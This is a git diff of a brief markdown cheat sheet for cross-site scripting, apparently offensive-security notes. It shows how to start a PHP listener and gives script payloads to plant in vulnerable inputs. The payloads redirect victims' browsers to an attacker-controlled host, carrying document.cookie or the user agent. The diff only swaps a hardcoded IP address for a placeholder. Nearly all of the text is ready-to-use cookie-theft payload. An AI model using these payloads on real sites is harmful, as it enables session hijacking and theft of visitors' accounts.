@@ -5,8 +5,8 @@
 php -S <lcoal_ip>:8000
 ```
 
-### place below code in vulnerable input
+### place below code in vulnerable inputs
 ```
-<script>window.location='http://10.11.0.42:8000/?cookie='+document.cookie</script>
-<script>window.location='http://10.11.0.42:8000/?cookie='+navigator.userAgent</script>
+<script>window.location='<lcoal_ip>:8000/?cookie='+document.cookie</script>
+<script>window.location='<lcoal_ip>:8000/?cookie='+navigator.userAgent</script>
 ```
